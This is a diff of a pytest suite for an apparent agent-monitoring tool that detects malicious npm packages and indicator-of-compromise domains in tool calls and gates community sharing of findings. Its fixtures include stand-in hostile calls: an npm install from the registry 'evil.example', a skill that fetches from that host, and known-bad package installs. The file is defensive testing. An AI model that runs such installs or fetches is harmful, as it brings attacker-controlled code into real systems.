@@ -413,20 +413,49 @@ def test_detect_all_discover_off_suppresses_candidates():
 # --- Refine R1b: verified matches build valid reports -----------------------
 
 
-@pytest.mark.parametrize("rule_key, command", [
-    ("npm:evil-pkg@1.0.0", "npm install evil-pkg@1.0.0"),   # pinned rule
-    ("npm:evil-pkg@*", "npm install evil-pkg@2.3.4"),        # whole-package rule, pinned install
-    ("npm:evil-pkg@*", "npm install evil-pkg"),              # whole-package rule, unpinned install
+@pytest.mark.parametrize("rule_key, advisory, command, shares", [
+    ("npm:evil-pkg@1.0.0", "MAL-2026-9", "npm install evil-pkg@1.0.0", True),    # pinned, advisory-backed
+    ("npm:evil-pkg@1.0.0", None, "npm install evil-pkg@1.0.0", False),           # no reason: stays local
+    ("npm:evil-pkg@*", "MAL-2026-9", "npm install evil-pkg@2.3.4", False),       # `*` needs typosquat/mirror
 ])
-def test_verified_dependency_match_passes_the_share_gate(rule_key, command):
+def test_verified_dependency_match_shares_only_with_a_spec_reason(rule_key, advisory, command, shares):
     """Before R1b a verified match carried EMPTY fields (only community matches
-    — which never auto-share — had them), so under the R1 schema the very
-    findings that should share could not be built."""
+    — which never auto-share — had them), so no verified match could build a
+    report. Now it carries its fields; whether it may leave follows plan §04:
+    a reason is required (``advisory:<id>`` here), and a whole-package (`*`)
+    report only for typosquat / internal-mirror-collision. (v1.3 moves verified
+    matches to the weekly digest — R2b.)"""
     sharing = load_blackbox("community.sharing")
     config_mod = load_blackbox("kernel.config")
-    rule = {"identifier": f"dep:{rule_key}", "source": "public", "kind": "malware", "severity": "critical"}
+    rule = {"identifier": f"dep:{rule_key}", "source": "public", "kind": "malware", "severity": "critical",
+            "advisoryId": advisory}
     findings = detection.detect_dependency("terminal", {"command": command}, _ruleset(dependency={rule_key: rule}))
     assert [f.source for f in findings] == ["public"]
     cfg = config_mod.BlackboxConfig(report=True, community_graph_id="did:dkg:context-graph:test")
     allowed, why = sharing.CommunitySharePolicy(cfg).decide(findings[0].to_dict(), "0x" + "1" * 40)
-    assert allowed, why
+    assert allowed is shares, why
+
+
+# --- R1 completion: where an indicator was met; why a dependency is malware ---
+
+
+@pytest.mark.parametrize("tool, args, context", [
+    ("web_extract", {"url": "https://evil.example/x"}, "fetched-by-tool"),
+    ("browser_navigate", {"url": "https://evil.example/x"}, "fetched-by-tool"),
+    ("terminal", {"command": "npm install evil-pkg@1.0.0 --registry https://evil.example"}, "in-dependency"),
+    ("skill_manage", {"name": "s", "code": "fetch('https://evil.example')"}, "in-skill"),
+    ("write_file", {"path": "notes.md", "content": "see https://evil.example"}, None),
+])
+def test_ioc_findings_carry_where_the_indicator_was_met(tool, args, context):
+    rs = _ruleset()
+    rs.ioc = {"ioc:domain:evil.example": {"identifier": "ioc:domain:evil.example", "source": "public",
+                                          "iocType": "domain", "severity": "high"}}
+    found = [f for f in detection.detect_all(tool, args, rs) if f.category == "ioc"]
+    assert found and found[0].fields.get("ioc_context") == context
+
+
+def test_osv_malware_candidate_gives_its_advisory_as_the_reason():
+    hit = {"advisory_id": "MAL-2026-5", "severity": "critical", "kind": "malware"}
+    findings = detection.discover_dependency_candidates(
+        "terminal", {"command": "npm install bad-pkg@1.0.0"}, _ruleset(), lambda *a: hit)
+    assert findings[0].fields["reason"] == "advisory:MAL-2026-5"
